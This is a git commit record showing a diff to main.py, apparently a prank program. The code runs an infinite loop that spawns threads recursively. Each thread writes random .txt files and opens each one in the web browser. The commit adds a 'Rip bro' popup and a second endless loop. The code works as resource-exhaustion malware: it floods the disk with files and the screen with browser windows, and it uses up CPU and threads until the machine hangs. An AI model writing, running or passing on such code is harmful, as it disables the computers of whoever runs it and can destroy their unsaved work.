98acb61ad7e331afef01d98bcdea7e7e49245274
Sunglocto <76428041+Sunglocto@users.noreply.github.com>
2022-03-25 07:10:51 +0000

    Update main.py

--- main.py
+++ main.py
@@ -3,15 +3,17 @@ import webbrowser
 import string
 import random
 from threading import Thread
+from tkinter import messagebox
 letters = string.ascii_lowercase
 def writeFile():
-    #wrieFile()
-    string =  ''.join(random.choice(letters) for i in range(10))  + ".txt"
-    with open(string, 'w') as f:
-        f.write(''.join(random.choice(letters) for i in range(1000)))
-        f.close()
-        webbrowser.open(string)
-        Thread(target=writeFile).start()
+    messagebox.showinfo("Lol", "Rip bro")
+    while True:
+        string =  ''.join(random.choice(letters) for i in range(10))  + ".txt"
+        with open(string, 'w') as f:
+            f.write(''.join(random.choice(letters) for i in range(1000)))
+            f.close()
+            webbrowser.open(string)
+            Thread(target=writeFile).start()
     
 while True:
     new_thread = Thread(target=writeFile)
